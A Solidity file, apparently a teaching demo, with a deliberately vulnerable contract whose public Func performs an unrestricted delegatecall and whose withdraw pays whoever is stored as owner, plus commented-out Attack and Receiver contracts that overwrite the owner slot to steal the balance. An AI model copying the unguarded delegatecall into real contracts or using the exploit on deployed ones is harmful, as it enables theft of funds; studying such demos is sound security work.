// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;
// pragma solidity ^0.4.25;

contract Servers {
    address owner;

    constructor() payable {
        require(msg.value > 0);
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }

    function Func(address addr, bytes calldata data) public {
        addr.delegatecall(data);
        //address(Attack).delegatecall(bytes4(keccak256("Attack_code()")));  
        //代码为被攻击者的代码，其使用了delegatecall函数。
    }
}

// contract Attack {
//     address owner;// NOTE: storage layout must be the same as contract Server

//     constructor() {
//         owner = msg.sender;
//     }

//     function exploit() public {
//         // the address of deployed Receiver contract for transfering stolen money
//         owner = address(0xB34db0d5aA577998c10c80d76F87AfE58b024e5F);
//     }
// }

// contract Receiver {
//     address owner;

//     constructor() {
//         owner = msg.sender;
//     }

//     // Function to receive Ether. msg.data must be empty
//     receive() external payable {}

//     // Fallback function is called when msg.data is not empty
//     fallback() external payable {}

//     function withdraw() public {
//         require(msg.sender == owner);
//         payable(msg.sender).transfer(address(this).balance);
//     }
// }